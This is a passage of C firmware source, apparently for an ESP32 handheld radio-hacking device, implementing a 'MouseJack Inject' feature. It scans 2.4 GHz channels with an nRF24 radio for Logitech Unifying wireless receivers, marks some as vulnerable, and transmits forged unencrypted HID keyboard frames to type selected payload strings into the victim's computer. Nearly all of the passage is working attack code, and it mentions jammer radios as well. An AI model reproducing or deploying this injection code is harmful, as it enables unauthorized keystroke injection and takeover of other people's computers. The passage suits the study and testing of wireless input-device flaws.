    (*t).vendor[sizeof((*t).vendor) - 1] = '\0';
    if (!(*t).vendor[0]) strcpy((*t).vendor, "nRF");
    MouseJackInject_s_targetCount++;
  }
  if (MouseJackInject_s_targetIndex >= MouseJackInject_s_targetCount)
    MouseJackInject_s_targetIndex = 0;
}

static int MouseJackInject_injFindTarget(const uint8_t* addr) {
  for (int i = 0; i < MouseJackInject_s_targetCount; i++) {
    if (memcmp(MouseJackInject_s_targets[i].addr, addr, 5) == 0) return i;
  }
  return -1;
}

static void MouseJackInject_injAddTarget(const uint8_t* addr, uint8_t ch,
                                         bool vulnerable, const char* vendor) {
  int idx = MouseJackInject_injFindTarget(addr);
  if (idx < 0) {
    if (MouseJackInject_s_targetCount >= MouseJackInject_kInjMaxTargets) return;
    idx = MouseJackInject_s_targetCount++;
    memset(&MouseJackInject_s_targets[idx], 0,
           sizeof(MouseJackInject_InjTarget));
    memcpy(MouseJackInject_s_targets[idx].addr, addr, 5);
    MouseJackInject_s_targets[idx].used = true;
  }
  MouseJackInject_s_targets[idx].channel = ch;
  if (vulnerable) MouseJackInject_s_targets[idx].vulnerable = true;
  if (vendor && vendor[0]) {
    strncpy(MouseJackInject_s_targets[idx].vendor, vendor,
            sizeof(MouseJackInject_s_targets[idx].vendor) - 1);
  }
  mjSharedPublish(addr, ch, vulnerable, vendor);
}

static void MouseJackInject_injConfigureRx(uint8_t prefix) {
  MouseJackInject_injDisable();
  MouseJackInject_injPowerUp();
  // 3-byte address for remnant recovery (Goodspeed-style)
  const uint8_t addr3[5] = {prefix, 0x00, 0x00, 0x00, 0x00};
  MouseJackInject_injWriteRegMulti(_INJ_RX_ADDR_P0, addr3, 5);
  MouseJackInject_injSetRegister(_INJ_SETUP_AW, 0x01);  // 3-byte address
  MouseJackInject_injSetRegister(_INJ_EN_AA, 0x00);
  MouseJackInject_injSetRegister(_INJ_EN_RXADDR, 0x01);
  MouseJackInject_injSetRegister(_INJ_SETUP_RETR, 0x00);
  MouseJackInject_injSetRegister(_INJ_RF_SETUP, 0x0F);  // 2Mbps
  MouseJackInject_injSetRegister(_INJ_RX_PW_P0, MouseJackInject_kInjPayloadMax);
  MouseJackInject_injSetRegister(_INJ_CONFIG,
                                 0x03);  // PWR_UP | PRIM_RX, CRC off
  MouseJackInject_injSetRegister(_INJ_RF_CH, MouseJackInject_s_channel);
  MouseJackInject_injFlushRx();
  MouseJackInject_injEnable();
  esp_rom_delay_us(130);
}

static void MouseJackInject_injConfigureTx(const uint8_t* addr5, uint8_t ch) {
  MouseJackInject_injDisable();
  MouseJackInject_injPowerUp();
  MouseJackInject_injWriteRegMulti(_INJ_TX_ADDR, addr5, 5);
  MouseJackInject_injWriteRegMulti(_INJ_RX_ADDR_P0, addr5, 5);
  MouseJackInject_injSetRegister(_INJ_SETUP_AW, 0x03);  // 5-byte
  MouseJackInject_injSetRegister(_INJ_EN_AA, 0x00);
  MouseJackInject_injSetRegister(_INJ_EN_RXADDR, 0x01);
  MouseJackInject_injSetRegister(_INJ_SETUP_RETR, 0x00);
  MouseJackInject_injSetRegister(_INJ_RF_SETUP, 0x0F);
  MouseJackInject_injSetRegister(_INJ_RX_PW_P0, 10);
  MouseJackInject_injSetRegister(_INJ_RF_CH, ch);
  // PWR_UP | PRIM_TX | EN_CRC | CRCO (2-byte CRC) — Logitech uses ESB CRC
  MouseJackInject_injSetRegister(_INJ_CONFIG, 0x0E);
  MouseJackInject_injFlushTx();
  MouseJackInject_injFlushRx();
}

static bool MouseJackInject_injRxAvailable(void) {
  return (MouseJackInject_injGetRegister(_INJ_STATUS) & 0x40) != 0;
}

static void MouseJackInject_injPollScanPacket(void) {
  if (!MouseJackInject_injRxAvailable()) return;
  uint8_t payload[MouseJackInject_kInjPayloadMax];
  spi_device_select(&(MouseJackInject_radio_transport));
  spi_device_transfer(&(MouseJackInject_radio_transport), 0x61);
  for (int i = 0; i < MouseJackInject_kInjPayloadMax; i++)
    payload[i] = spi_device_transfer(&(MouseJackInject_radio_transport), 0xFF);
  spi_device_deselect(&(MouseJackInject_radio_transport));
  MouseJackInject_injSetRegister(_INJ_STATUS, 0x70);

  // Reconstruct: addr = {prefix, 0x00, 0x00, p0, p1}, HID starts at p2
  // Also try HID at p0 (if full payload landed).
  uint8_t addr[5] = {(uint8_t)MouseJackInject_s_prefixByte, 0x00, 0x00,
                     payload[0], payload[1]};
  const uint8_t* hid = payload + 2;
  int hidLen = 10;
  bool ok = MouseJackInject_injLooksLikeLogitech(hid, 10);
  if (!ok && MouseJackInject_injLooksLikeLogitech(payload, 10)) {
    // Payload already starts with HID — address incomplete; still store
    // fingerprint addr
    hid = payload;
    ok = true;
    // Prefer using prefix + first bytes as tracking id
  }
  if (!ok) return;

  const bool vuln = (hid[1] == 0xC1 || hid[1] == 0x10 || hid[1] == 0x00);
  MouseJackInject_injAddTarget(addr, MouseJackInject_s_channel, vuln,
                               "Logitech");
  MouseJackInject_injAppendLog(
      text_join_cstr(
          (text_join_cstr(
               (text_join_cstr("+ ", (MouseJackInject_injAddrStr(addr)).data))
                   .data,
               " ch"))
              .data,
          (TEXT(MouseJackInject_s_channel)).data),
      vuln ? UI_WARN : UI_OK);
  MouseJackInject_s_statusDirty = true;
}

static void MouseJackInject_injScanStep(void) {
  if (!MouseJackInject_s_scanning || MouseJackInject_s_injecting) return;
  const uint32_t now = sys_monotonic_ms();
  if (now - MouseJackInject_s_lastHopMs < MouseJackInject_kInjHopIntervalMs) {
    MouseJackInject_injPollScanPacket();
    return;
  }
  MouseJackInject_s_lastHopMs = now;

  // Advance prefix, then channel
  MouseJackInject_s_prefixByte++;
  if (MouseJackInject_s_prefixByte >
      0x7F) {  // cover common Unifying high-bit-clear range quickly
    MouseJackInject_s_prefixByte = 0;
    MouseJackInject_s_hopIndex =
        (MouseJackInject_s_hopIndex + 1) % MouseJackInject_kInjChannelCount;
    MouseJackInject_s_channel =
        MouseJackInject_kInjChannels[MouseJackInject_s_hopIndex];
  }
  MouseJackInject_injConfigureRx((uint8_t)MouseJackInject_s_prefixByte);
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injPollScanPacket();
}

static void MouseJackInject_injStartScan(void) {
  MouseJackInject_s_scanning = true;
  MouseJackInject_s_prefixByte = 0;
  MouseJackInject_s_hopIndex = 0;
  MouseJackInject_s_channel = MouseJackInject_kInjChannels[0];
  MouseJackInject_injConfigureRx(0);
  MouseJackInject_injAppendLog(TEXT("[+] Scanning for Unifying HID"), UI_WARN);
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injFlushUi(true);
}

static void MouseJackInject_injStopScan(void) {
  if (!MouseJackInject_s_scanning) return;
  MouseJackInject_s_scanning = false;
  MouseJackInject_injDisable();
  MouseJackInject_injAppendLog(
      text_join_cstr(
          (text_join_cstr("[*] Scan stop — ",
                          (TEXT(MouseJackInject_s_targetCount)).data))
              .data,
          " targets"),
      UI_DIM_TEXT);
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injFlushUi(true);
}

// USB HID keyboard scancodes (subset).
static bool MouseJackInject_injCharToHid(char c, uint8_t* modifier,
                                         uint8_t* key) {
  (*modifier) = 0;
  (*key) = 0;
  if (c >= 'a' && c <= 'z') {
    (*key) = 0x04 + (c - 'a');
    return true;
  }
  if (c >= 'A' && c <= 'Z') {
    (*modifier) = 0x02;  // Left Shift
    (*key) = 0x04 + (c - 'A');
    return true;
  }
  if (c >= '1' && c <= '9') {
    (*key) = 0x1E + (c - '1');
    return true;
  }
  if (c == '0') {
    (*key) = 0x27;
    return true;
  }
  switch (c) {
    case ' ':
      (*key) = 0x2C;
      return true;
    case '\n':
    case '\r':
      (*key) = 0x28;
      return true;
    case '\t':
      (*key) = 0x2B;
      return true;
    case '-':
      (*key) = 0x2D;
      return true;
    case '=':
      (*key) = 0x2E;
      return true;
    case '[':
      (*key) = 0x2F;
      return true;
    case ']':
      (*key) = 0x30;
      return true;
    case '\\':
      (*key) = 0x31;
      return true;
    case ';':
      (*key) = 0x33;
      return true;
    case '\'':
      (*key) = 0x34;
      return true;
    case '`':
      (*key) = 0x35;
      return true;
    case ',':
      (*key) = 0x36;
      return true;
    case '.':
      (*key) = 0x37;
      return true;
    case '/':
      (*key) = 0x38;
      return true;
    case '!':
      (*modifier) = 0x02;
      (*key) = 0x1E;
      return true;
    case '@':
      (*modifier) = 0x02;
      (*key) = 0x1F;
      return true;
    case '#':
      (*modifier) = 0x02;
      (*key) = 0x20;
      return true;
    case '$':
      (*modifier) = 0x02;
      (*key) = 0x21;
      return true;
    case '%':
      (*modifier) = 0x02;
      (*key) = 0x22;
      return true;
    case '^':
      (*modifier) = 0x02;
      (*key) = 0x23;
      return true;
    case '&':
      (*modifier) = 0x02;
      (*key) = 0x24;
      return true;
    case '*':
      (*modifier) = 0x02;
      (*key) = 0x25;
      return true;
    case '(':
      (*modifier) = 0x02;
      (*key) = 0x26;
      return true;
    case ')':
      (*modifier) = 0x02;
      (*key) = 0x27;
      return true;
    case '_':
      (*modifier) = 0x02;
      (*key) = 0x2D;
      return true;
    case '+':
      (*modifier) = 0x02;
      (*key) = 0x2E;
      return true;
    case '{':
      (*modifier) = 0x02;
      (*key) = 0x2F;
      return true;
    case '}':
      (*modifier) = 0x02;
      (*key) = 0x30;
      return true;
    case '|':
      (*modifier) = 0x02;
      (*key) = 0x31;
      return true;
    case ':':
      (*modifier) = 0x02;
      (*key) = 0x33;
      return true;
    case '"':
      (*modifier) = 0x02;
      (*key) = 0x34;
      return true;
    case '<':
      (*modifier) = 0x02;
      (*key) = 0x36;
      return true;
    case '>':
      (*modifier) = 0x02;
      (*key) = 0x37;
      return true;
    case '?':
      (*modifier) = 0x02;
      (*key) = 0x38;
      return true;
    default:
      return false;
  }
}

static void MouseJackInject_injWritePayload(const uint8_t* data, uint8_t len) {
  spi_device_select(&(MouseJackInject_radio_transport));
  spi_device_transfer(&(MouseJackInject_radio_transport),
                      0xA0);  // W_TX_PAYLOAD
  for (uint8_t i = 0; i < len; i++)
    spi_device_transfer(&(MouseJackInject_radio_transport), data[i]);
  spi_device_deselect(&(MouseJackInject_radio_transport));

  MouseJackInject_injSetRegister(_INJ_STATUS, 0x70);
  // CE pulse to transmit
  MouseJackInject_injEnable();
  esp_rom_delay_us(15);
  MouseJackInject_injDisable();
  esp_rom_delay_us(150);
}

static void MouseJackInject_injSendHidFrame(uint8_t modifier, uint8_t key) {
  // Unencrypted Logitech Unifying keyboard frame (BN-0002 style)
  uint8_t frame[10] = {0x00, 0xC1, modifier, key,  0x00,
                       0x00, 0x00, 0x00,     0x00, 0x00};
  frame[9] = MouseJackInject_injLogitechChecksum(frame, 10);
  MouseJackInject_injWritePayload(frame, 10);
}

static void MouseJackInject_injSendKeepalive(void) {
  uint8_t payload[5];
  payload[0] = 0x00;
  payload[1] = 0x40;
  payload[2] = 0x4F;
  payload[3] = 110;
  payload[4] = 0;
  payload[4] = MouseJackInject_injLogitechChecksum(payload, 5);
  MouseJackInject_injWritePayload(payload, 5);
}

static void MouseJackInject_injTransmitString(const char* text) {
  if (MouseJackInject_s_targetCount <= 0 || MouseJackInject_s_targetIndex < 0 ||
      MouseJackInject_s_targetIndex >= MouseJackInject_s_targetCount) {
    MouseJackInject_injAppendLog(TEXT("[!] No target selected"), UI_WARN);
    MouseJackInject_injFlushUi(true);
    return;
  }
  if (MouseJackInject_s_injecting) return;

  __auto_type t = &(MouseJackInject_s_targets[MouseJackInject_s_targetIndex]);
  MouseJackInject_s_injecting = true;
  MouseJackInject_s_scanning = false;
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injFlushUi(true);

  MouseJackInject_injAppendLog(
      text_join_cstr("[>] Fire -> ",
                     (MouseJackInject_injAddrStr((*t).addr)).data),
      UI_WARN);
  MouseJackInject_injFlushUi(true);

  MouseJackInject_injConfigureTx((*t).addr, (*t).channel);
  MouseJackInject_injSendKeepalive();
  sys_sleep_ms(5);

  // Also try nearby channels (dongles hop)
  const int chTry[3] = {(*t).channel, ((*t).channel + 1) % 84,
                        ((*t).channel + 83) % 84};

  for (size_t ci = 0; text[ci]; ci++) {
    if (feature_exit_requested || featureExitButtonPressed()) break;

    uint8_t mod = 0, key = 0;
    if (!MouseJackInject_injCharToHid(text[ci], &(mod), &(key))) continue;

    for (int c = 0; c < 3; c++) {
      MouseJackInject_injSetRegister(_INJ_RF_CH, (uint8_t)chTry[c]);
      MouseJackInject_injSendHidFrame(mod, key);  // key down
      sys_sleep_ms(MouseJackInject_kInjKeyDelayMs);
      MouseJackInject_injSendHidFrame(0x00, 0x00);  // key up
      sys_sleep_ms(MouseJackInject_kInjKeyDelayMs);
    }
    MouseJackInject_s_injectCount++;

    if ((ci % 4) == 0) {
      maintainTouchNavBar();
      MouseJackInject_runUI();
      MouseJackInject_s_statusDirty = true;
      MouseJackInject_injFlushUi(false);
    }
  }

  MouseJackInject_injSendKeepalive();
  MouseJackInject_injDisable();
  MouseJackInject_injAppendLog(
      text_join_cstr(
          (text_join_cstr("[+] Done (", (TEXT(strlen(text))).data)).data,
          " chars)"),
      UI_OK);
  MouseJackInject_s_injecting = false;
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injFlushUi(true);
}

static void MouseJackInject_injPrevTarget(void) {
  if (MouseJackInject_s_targetCount <= 0) return;
  MouseJackInject_s_targetIndex =
      (MouseJackInject_s_targetIndex - 1 + MouseJackInject_s_targetCount) %
      MouseJackInject_s_targetCount;
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injFlushUi(true);
}

static void MouseJackInject_injNextTarget(void) {
  if (MouseJackInject_s_targetCount <= 0) return;
  MouseJackInject_s_targetIndex =
      (MouseJackInject_s_targetIndex + 1) % MouseJackInject_s_targetCount;
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injFlushUi(true);
}

static void MouseJackInject_injNextPayload(void) {
  MouseJackInject_s_payloadIndex =
      (MouseJackInject_s_payloadIndex + 1) % MouseJackInject_kPayloadCount;
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injAppendLog(
      text_join_cstr(
          "[*] Payload: ",
          (TEXT(MouseJackInject_kPayloads[MouseJackInject_s_payloadIndex]))
              .data),
      UI_DIM_TEXT);
  MouseJackInject_injFlushUi(true);
}

static void MouseJackInject_injToggleScanOrFire(void) {
  // UP = Fire
  MouseJackInject_injStopScan();
  MouseJackInject_injTransmitString(
      MouseJackInject_kPayloads[MouseJackInject_s_payloadIndex]);
}

static unsigned long MouseJackInject_s_injLastBtnMs = 0;

static void MouseJackInject_injWaitNavRelease(int pin) {
  const uint32_t t0 = sys_monotonic_ms();
  while (isTouchNavButtonPressed(pin) && sys_monotonic_ms() - t0 < 400)
    sys_sleep_ms(5);
  sys_sleep_ms(30);
}

void MouseJackInject_injHandleNavButtons(void) {
  if (!featureHasTouchNavBar()) return;
  if (sys_monotonic_ms() - MouseJackInject_s_injLastBtnMs < 80) return;

  if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
    MouseJackInject_injPrevTarget();
    MouseJackInject_s_injLastBtnMs = sys_monotonic_ms();
    MouseJackInject_injWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_RIGHT)) {
    MouseJackInject_injNextTarget();
    MouseJackInject_s_injLastBtnMs = sys_monotonic_ms();
    MouseJackInject_injWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_DOWN)) {
    if (MouseJackInject_s_scanning) {
      MouseJackInject_injStopScan();
    } else {
      MouseJackInject_injNextPayload();
    }
    MouseJackInject_s_injLastBtnMs = sys_monotonic_ms();
    MouseJackInject_injWaitNavRelease(BTN_DOWN);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_UP)) {
    if (MouseJackInject_s_targetCount == 0 || MouseJackInject_s_scanning) {
      if (MouseJackInject_s_scanning)
        MouseJackInject_injStopScan();
      else
        MouseJackInject_injStartScan();
    } else {
      MouseJackInject_injToggleScanOrFire();
    }
    MouseJackInject_s_injLastBtnMs = sys_monotonic_ms();
    MouseJackInject_injWaitNavRelease(BTN_UP);
  }
}

void MouseJackInject_runUI(void) {
  enum { kBarY = 20 };
  enum { kBarH = 16 };
  enum { kIconSz = 16 };
  enum { kIconN = 5 };
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;
  static const unsigned char* icons[kIconN] = {
      bitmap_icon_LEFT, bitmap_icon_random, bitmap_icon_start,
      bitmap_icon_RIGHT, bitmap_icon_go_back};

  if (!MouseJackInject_uiDrawn) {
    display_fill_rect(&(tft), 0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i])
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], kIconSz, kIconSz,
                            UI_ICON);
    }
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_draw_fast_h_line(&(tft), 0, kBarY + kBarH, 240, UI_LINE);
    MouseJackInject_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                          kIconSz, kIconSz, UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0:
          MouseJackInject_injPrevTarget();
          break;
        case 1:
          if (MouseJackInject_s_scanning)
            MouseJackInject_injStopScan();
          else
            MouseJackInject_injStartScan();
          break;
        case 2:
          if (MouseJackInject_s_targetCount == 0)
            MouseJackInject_injStartScan();
          else
            MouseJackInject_injToggleScanOrFire();
          break;
        case 3:
          MouseJackInject_injNextTarget();
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > kBarY && y < kBarY + kBarH) {
        for (int i = 0; i < kIconN; i++) {
          if (x > iconX[i] && x < iconX[i] + kIconSz) {
            if (icons[i] && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                MouseJackInject_s_active = false;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], kIconSz,
                                    kIconSz, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void MouseJackInject_mouseJackInjectSetup(void) {
  setTouchButtonInputEnabled(true);
  bleSetMjInjectNavLabels();
  bleClearBody(TFT_BLACK);

  MouseJackInject_uiDrawn = false;
  MouseJackInject_s_active = true;
  MouseJackInject_s_scanning = false;
  MouseJackInject_s_injecting = false;
  MouseJackInject_s_channel = MouseJackInject_kInjChannels[0];
  MouseJackInject_s_hopIndex = 0;
  MouseJackInject_s_prefixByte = 0;
  MouseJackInject_s_lastHopMs = sys_monotonic_ms();
  MouseJackInject_s_payloadIndex = 0;
  MouseJackInject_s_injectCount = 0;
  MouseJackInject_s_logIndex = 0;
  MouseJackInject_s_logDirty = false;
  MouseJackInject_s_statusDirty = false;
  MouseJackInject_s_lastUiMs = 0;

  for (int i = 0; i < MouseJackInject_kInjMaxLogLines; i++) {
    MouseJackInject_s_logBuffer[i] = TEXT("");
    MouseJackInject_s_logColor[i] = UI_DIM_TEXT;
    MouseJackInject_s_logDrawn[i] = TEXT("");
    MouseJackInject_s_logDrawnColor[i] = 0;
    MouseJackInject_s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < MouseJackInject_kInjStatusLines; i++) {
    MouseJackInject_s_statusText[i] = TEXT("");
    MouseJackInject_s_statusColor[i] = 0;
    MouseJackInject_s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < MouseJackInject_kInjMaxTargets; i++)
    MouseJackInject_s_targets[i].used = false;

  MouseJackInject_injImportShared();
  MouseJackInject_s_targetIndex = 0;

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();

  MouseJackInject_runUI();
  MouseJackInject_injDrawTextBoxes();
  MouseJackInject_injAppendLog(TEXT("[+] MouseJack Inject ready"), UI_WARN);
  if (MouseJackInject_s_targetCount > 0) {
    MouseJackInject_injAppendLog(
        text_join_cstr(
            (text_join_cstr("[*] Imported ",
                            (TEXT(MouseJackInject_s_targetCount)).data))
                .data,
            " from scanner"),
        UI_OK);
  } else {
    MouseJackInject_injAppendLog(TEXT("[*] Fire/Scan to find targets"),
                                 UI_DIM_TEXT);
  }
  MouseJackInject_s_statusDirty = true;
  MouseJackInject_injFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  sys_configure_gpio(CE, GPIO_MODE_OUTPUT);
  sys_configure_gpio(CSN, GPIO_MODE_OUTPUT);
  MouseJackInject_injInitSpi();
  MouseJackInject_injDisable();
  MouseJackInject_injPowerUp();
  redrawTouchButtonBar();
}

void MouseJackInject_mouseJackInjectLoop(void) {
  MouseJackInject_s_active = true;
  while (MouseJackInject_s_active) {
    if (feature_active &&
        (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      MouseJackInject_s_active = false;
      break;
    }
    MouseJackInject_injHandleNavButtons();
    maintainTouchNavBar();
    MouseJackInject_runUI();
    if (MouseJackInject_s_scanning) MouseJackInject_injScanStep();
    MouseJackInject_injFlushUi(false);
    sys_sleep_ms(1);
  }
}

void MouseJackInject_exit(void) {
  MouseJackInject_s_active = false;
  MouseJackInject_s_scanning = false;
  MouseJackInject_s_injecting = false;
  MouseJackInject_injDisable();
  MouseJackInject_injPowerDown();
  spi_device_deselect(&(MouseJackInject_radio_transport));
  refreshSdMount();
}

void stopForegroundRadios(void) {
  if (ble_service_ready()) {
    ble_scan_stop(ble_service_scan());
    ble_scan_set_callback(ble_service_scan(), NULL, NULL);
    ble_advertising_stop(ble_service_advertiser());
  }
  rf24_power_down(&(BleJammer_radio1));
  rf24_power_down(&(BleJammer_radio2));
  rf24_power_down(&(BleJammer_radio3));
  rf24_power_down(&(ProtoKill_radio1));
  rf24_power_down(&(ProtoKill_radio2));
  rf24_power_down(&(ProtoKill_radio3));
  rf24_power_down(&(Scanner_spectrum_radio));
}
